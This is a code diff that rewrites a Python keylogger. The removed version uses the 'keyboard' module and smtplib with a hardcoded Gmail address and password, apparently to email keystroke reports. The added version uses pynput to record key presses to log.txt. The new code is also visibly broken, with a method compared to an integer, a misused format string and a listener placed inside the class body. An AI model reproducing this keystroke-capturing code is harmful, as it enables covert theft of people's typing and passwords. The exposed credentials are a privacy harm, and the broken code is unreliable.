@@ -1,36 +1,35 @@
-import keyboard
-import smtplib
-from threading import Timer
+'''Need a Copyright.? Why anyways all are copy pasted'''
+
+from pynput.keyboard import Key, Listener
 
 
+class keylogs:
+    '''logger sclass'''
 
-send_report_evry = 30
-emailaddress = "shreeshavoniyadka@gmail.com"
-emailpassword="shreesha0210"
-class Keylogger():
+    def __init__(self) -> None:
+        self.count = 0
+        self.keys = []
 
-  def __init__(self) -> None:
-      pass
-  def callback(self, event):
-          """
-          This callback is invoked whenever a keyboard event is occured
-          (i.e when a key is released in this example)
-          """
-          name = event.name
-          if len(name) > 1:
-              # not a character, special key (e.g ctrl, alt, etc.)
-              # uppercase with []
-              if name == "space":
-                  # " " instead of "space"
-                  name = " "
-              elif name == "enter":
-                  # add a new line whenever an ENTER is pressed
-                  name = "[ENTER]\n"
-              elif name == "decimal":
-                  name = "."
-              else:
-                  # replace spaces with underscores
-                  name = name.replace(" ", "_")
-                  name = f"[{name.upper()}]"
-          # finally, add the key name to our global `self.log` variable
-          self.log += name
+    def on_press(self, key):
+        '''what happens is recorded in on_press'''
+        self.keys.append(key)
+        self.count = self.count+1
+        print(f"{0} pressed".format(key))
+        if self.keys.count > 10:
+            self.count = 0
+            self.write_file(self.keys)
+            self.keys = []
+
+    def write_file(self, keys):
+        '''write file in log text'''
+        with open("log.txt", "a", encoding='UTF-8') as inputfile:
+            for key in keys:
+                inputfile.write(key)
+
+    def on_release(self, key):
+        '''release the key'''
+        if key == Key.esc:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
